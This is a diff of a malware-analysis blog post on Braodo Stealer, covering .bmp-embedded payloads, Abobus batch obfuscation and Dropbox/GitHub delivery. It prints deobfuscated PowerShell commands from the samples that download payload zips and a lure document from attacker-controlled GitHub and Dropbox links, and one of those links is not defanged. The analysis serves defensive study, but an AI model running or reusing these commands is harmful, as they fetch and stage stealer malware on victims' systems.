@@ -8,10 +8,9 @@ categories: malware-analysis
 
 - Background.
 - Technical Analysis.
-    - Metadata.
-    - Encoding and variable rename.
-    - Abusing Abobus-Obfuscator & Dropbox services.
     - Abusing .bmp file format.
+    - Encoding and Obfuscation.
+    - Abusing Dropbox services.
 - Conclusion.
 
 ## Background
@@ -23,32 +22,52 @@ Hi readers, hope you enjoyed my last blog on Braodo Stealer, as a newbie and as 
 
 In this phase, we will know different methods that this stealer uses to download the payload and run the malware code in the system
 
-### Metadata
-
-SHA-256 : `e314fc6308c31b600eb43fee5e4716034375f0a7e6916326c605ec955ead5757`
-
-file name : batch_obfuscator.malwre
-
-SHA-256 : `dba09794ee80639df8633b23219d29976bd7fabcb60db063023f3ba8f9cc1c9b`
-
-file name : bmp_payload
-
-SHA-256 : `a93d56fde501f5341c1c84e5a1f2f17253bbcada088898b2cb3df35c9ff68b93`
-
-file name : duckyy26.sample
-
-SHA-256 : `4d7892ce5812d01041cdeff95bc622dda3f6bb3add64045eb15ce73215080b52`
-
-file name : Wukong.zip
-
-### Encoding and variable rename.
-
-### Abusing Abobus-Obfuscator & Dropbox services.
-![abobus_obfuscator](https://github.com/user-attachments/assets/e0e1974e-1726-4b61-b109-54c0b6b6ed02)
 
 ### Abusing .bmp file format.
 
-![bmp_payload](https://github.com/user-attachments/assets/1210ec36-f690-4c52-b7b8-39f1a72bd935)
+One of the recent developments of Braodo Stealer's arsenal has been abusing bmp format for initial infections.
+
+![image](https://github.com/user-attachments/assets/eb044983-e72d-46d3-a6a1-2701f87ea7f7)
+
+
+So, we can see that there is encoded garbage blob present inside the bmp payload and the actual script which is responsible for downloading the final payload from Github which is exactly the same just like the previous campaigns with just different Github accounts downloading the final Python script.
+
+### Encoding and obfuscation.
+
+Another interesting development among stealer arsenal, that it has been using an open source obfuscator,known as abobus obfuscator.we found the name of the obfuscator as it is present in one of the sample.
+
+![image](https://github.com/user-attachments/assets/0d2dae90-19d0-4d1d-b143-6ae11d6843ee)
+
+the way this obfuscator works is by adding garbage values to the batch script then performing character encoding and by changing the cases of the alphabets in a random manner. The way the sample deobfuscates and runs in memory is by changing the code page by using chcp windows utility and chnaging the code page to english which further faciliates the execution of the malicious batch script which downloads the zip payload from either dropbox or github. As this is an open source obfuscator it was quite easy to understand and perform the deobfuscation.
+
+the extracted config is as follows:
+
+```
+[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12
+(new-object -typename system.net.webclient).downloadfile("hxxps://github.com/LoneNone1807/abcxyz/raw/main/abcxyz.zip", "C:\\Users\\Public\\25350.zip")
+
+```
+ 
+### Abusing Dropbox services.
+
+as we know that the primary technique of braodo stealer is to store the final payload over github, but recently in one of the campaign which was obfuscated with abobus obfuscator was dropping a document as a lure . The document was mainly focused on online marketing of shooes. 
+
+
+![image](https://github.com/user-attachments/assets/7a8ed849-736e-4b87-92aa-3f92b0f4ca36)
+
+So , post the lure did open on the screen, i deobfuscated and found out that this campaign is using dropbox services to download the payload and also adding a registry key as persistance. the extracted configs are as follows:
+
+```
+[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12
+(new-object -typename system.net.webclient).downloadfile("hxxps://www.dropbox.com/scl/fi/mkx2tii0ud0i6ugpbbjh6/Product_Marketing_and_Brand_Marketing_Campaigns0909.docx?rlkey=4gqc2cpjo6kp5iltdjevlbxzv&st=50y5pfp4&dl=1", "C:\\Users\\Admin\\AppData\\Local\\Temp\\\\Product_Marketing_and_Brand_Marketing_Campaigns0909.docx")
+```
+
+```
+[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12
+(new-object -typename system.net.webclient).downloadfile("https://www.dropbox.com/scl/fi/0qh04if44j5q056ehruij/tn0909.zip?rlkey=f9zmunjbhjdmsuh7by9bp4wf1&st=ffsvc7c8&dl=1", "C:\\Users\\Public\\Document.zip")
+```
+
+### Abusing whl package
 
 ## Conclusion.
 
